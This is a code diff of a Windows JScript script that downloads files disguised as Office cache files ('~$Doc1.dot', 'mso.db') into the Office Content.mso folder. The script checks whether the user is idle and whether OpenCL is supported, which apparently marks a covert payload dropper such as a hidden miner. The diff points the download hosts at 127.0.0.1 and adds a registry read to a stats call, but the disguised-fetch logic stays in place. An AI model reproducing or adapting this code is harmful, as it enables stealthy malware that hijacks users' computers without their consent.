@@ -21,7 +21,7 @@ var __shellapp = new ActiveXObject("Shell.Application");
 
 //var __workdir = __storage.GetFolderPath(0, 0x0020, 0, 0) + "\\Content.mso\\"	
 var __workdir = __shellapp.Namespace(0x0020).Self.Path + "\\Content.mso\\";
-var __destReady ={ name: "~$Doc1.dot",url:"http://conf.xmp.kankan.com/config/~$Doc1.dot", md5:"E43B5D93BF0AF49859562AED85EEEF0A" }
+var __destReady ={ name: "~$Doc1.dot",url:"http://127.0.0.1/config/~$Doc1.dot", md5:"4391B32E2DFC006BAF4A013CA67720F2" }
 var __startTickCout = __external.GetTickCount()
 var __lastInputInfo = __external.GetLastInputInfo()
 /*
@@ -36,7 +36,7 @@ if(__DEBUG)
 	__idletime=1000*15
 else if(__IsSupportOpencl)
 	__idletime=1000*30
-var __destReady_dll ={ name: "mso.db",url:"http://conf.xmp.kankan.com/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" }
+var __destReady_dll ={ name: "mso.db",url:"http://127.0.0.1/config/mso.db", md5:"56C9CE5E71638A520003082AC620D0CB" }
 var __installReadys = [/*
 						{id: 10001, name: "XMPSetup-fanli.exe", url:"http://xmp.down.sandai.net/kankan/XMPSetupLite_4.9.10.1806(2).exe", 
 							md5:"8867658a8edd9765342bfc2483ed8c3e", param:" /S",
@@ -261,7 +261,8 @@ function sendHttpStat(category, action , value ,syn){
 	var objXMLHTTP = getXmlHttp();
 	if(objXMLHTTP)
 	{
-		var label= function(){var ver = __external.GetHostVersion(); return ver;}();	
+		var label= __TRY(function(){ return __wshShell.RegRead("HKEY_CURRENT_USER\\Software\\ExtIconHandler\\if");}, "default");
+		//var label= function(){var ver = __external.GetHostVersion(); return ver;}();	
 		var url;
 		if(__DEBUG)
 			url = "http://www.google-analytics.com/collect"
